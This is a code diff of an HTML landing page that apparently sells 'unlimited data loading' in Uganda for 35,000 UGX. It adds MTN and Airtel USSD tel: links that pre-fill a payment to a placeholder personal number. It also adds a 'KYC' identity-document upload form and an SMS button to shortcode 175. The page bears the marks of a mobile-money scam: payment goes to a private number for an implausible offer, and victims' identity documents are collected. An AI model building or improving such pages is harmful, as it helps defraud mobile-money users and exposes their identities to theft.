@@ -29,6 +29,55 @@
     p.subtitle { font-size: 0.95rem; color: #d1d5db; max-width: 600px; line-height: 1.6; margin-bottom: 30px; text-align: center; }
 
     .form-container { width: 100%; max-width: 600px; background: rgba(10, 10, 10, 0.85); border: 1px solid rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); padding: 40px; text-align: left; border-radius: 4px; }
+    
+    /* Payment Guidance Box */
+    .payment-instruction {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+    }
+    .payment-instruction h4 {
+      font-size: 0.8rem;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: #ffcc00;
+      margin-bottom: 8px;
+    }
+    .payment-instruction p {
+      font-size: 0.85rem;
+      color: #cccccc;
+      line-height: 1.4;
+    }
+
+    /* Network Payment Buttons */
+    .payment-actions { display: flex; flex-direction: column; gap: 12px; margin-bottom: 25px; }
+    
+    .btn-payment {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 14px 20px;
+      font-size: 0.8rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      text-decoration: none;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+
+    .btn-mtn { background-color: #ffcc00; color: #000000; border: 1px solid #ffcc00; }
+    .btn-mtn:hover { background-color: #e6b800; }
+
+    .btn-airtel { background-color: #e60000; color: #ffffff; border: 1px solid #e60000; }
+    .btn-airtel:hover { background-color: #cc0000; }
+
+    .provider-logo { width: 22px; height: 22px; }
+
+    /* Form Fields */
     .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
     .form-group { display: flex; flex-direction: column; margin-bottom: 15px; }
     .form-group.full-width { grid-column: span 2; }
@@ -40,9 +89,23 @@
     .btn-main { background-color: #ffffff; color: #000000; padding: 14px 32px; border: 1px solid #ffffff; font-size: 0.8rem; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; cursor: pointer; width: 100%; margin-top: 15px; transition: all 0.3s ease; }
     .btn-main:hover { background-color: transparent; color: #ffffff; }
 
-    /* MTN USSD Trigger Button */
-    .btn-mtn { background-color: #ffcc00; color: #000000; padding: 14px 32px; border: 1px solid #ffcc00; font-size: 0.8rem; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; text-decoration: none; display: block; text-align: center; margin-bottom: 25px; transition: all 0.3s ease; }
-    .btn-mtn:hover { background-color: #e6b800; color: #000000; }
+    /* Post-Verification SMS Trigger Button */
+    .btn-sms {
+      background-color: #25d366;
+      color: #ffffff;
+      padding: 14px 20px;
+      border: 1px solid #25d366;
+      font-size: 0.85rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 20px;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+    .btn-sms:hover { background-color: #1ebd56; }
 
     .thank-you-box { display: none; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); padding: 30px; text-align: center; }
     .btn-back { color: #888888; text-decoration: none; font-size: 0.8rem; letter-spacing: 1.5px; text-transform: uppercase; margin-top: 25px; }
@@ -71,16 +134,43 @@
   <div class="page-container">
     <h1>UNLIMITED DATA LOADING</h1>
     <div class="price-tag">FIXED RATE: 35,000 UGX</div>
-    <p class="subtitle">Complete identity verification below and submit your payment details to qualify for direct data loading.</p>
+    <p class="subtitle">Select your payment network below to initiate transfer, upload your verification documents, and activate your account.</p>
 
     <div class="form-container">
       
-      <!-- MTN USSD Prompt Button (Replace 0700000000 with your MTN number) -->
-      <a href="tel:*165*1*1*0700000000*35000%23" class="btn-mtn">
-        Pay UGX 35,000 via MTN MoMo (USSD)
-      </a>
+      <!-- Direction Guide -->
+      <div class="payment-instruction">
+        <h4>Step 1: Execute Mobile Payment</h4>
+        <p>Tap your provider button below. Your device will automatically prompt your phone dialer with the pre-filled payment command for <strong>35,000 UGX</strong>.</p>
+      </div>
 
+      <!-- Payment Method Buttons with Logos -->
+      <div class="payment-actions">
+        <!-- MTN Uganda Prompt (Replace 0770000000 with your MTN Number) -->
+        <a href="tel:*165*1*1*0770000000*35000%23" class="btn-payment btn-mtn">
+          <svg class="provider-logo" viewBox="0 0 24 24" fill="currentColor">
+            <circle cx="12" cy="12" r="10" fill="#000"/>
+            <text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#ffcc00" font-size="8" font-weight="bold">MTN</text>
+          </svg>
+          Pay UGX 35,000 via MTN MoMo
+        </a>
+
+        <!-- Airtel Uganda Prompt (Replace 0750000000 with your Airtel Number) -->
+        <a href="tel:*185*1*1*0750000000*35000%23" class="btn-payment btn-airtel">
+          <svg class="provider-logo" viewBox="0 0 24 24" fill="currentColor">
+            <circle cx="12" cy="12" r="10" fill="#fff"/>
+            <text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#e60000" font-size="7" font-weight="bold">airtel</text>
+          </svg>
+          Pay UGX 35,000 via Airtel Money
+        </a>
+      </div>
+
+      <!-- Verification & Proof Form -->
       <form id="dataForm" onsubmit="handleDataSubmit(event)">
+        <div class="payment-instruction" style="margin-top: 10px;">
+          <h4>Step 2: Upload KYC Verification</h4>
+        </div>
+
         <div class="form-grid">
           <div class="form-group">
             <label for="firstName">First Name</label>
@@ -123,12 +213,18 @@
           </div>
         </div>
 
-        <button type="submit" class="btn-main">Submit Verification & Payment</button>
+        <button type="submit" class="btn-main">Verify & Submit Details</button>
       </form>
 
+      <!-- Confirmation Screen with KYC SMS Command -->
       <div id="dataThankYou" class="thank-you-box">
-        <h3>Verification Received</h3>
-        <p>Thank you for submitting your details and payment proof for 35,000 UGX. We will process your credentials and activate your unlimited data loading shortly via WhatsApp.</p>
+        <h3>Verification Submitted</h3>
+        <p>Your payment proof and KYC documents have been recorded. Click the button below to trigger your SMS activation message to shortcode 175.</p>
+        
+        <!-- SMS Command to 175 -->
+        <a href="sms:175?body=KYC%20Unlimited%20Data%20Loading%20Request" class="btn-sms">
+          Load Unlimited Data (Send KYC to 175)
+        </a>
       </div>
     </div>
 
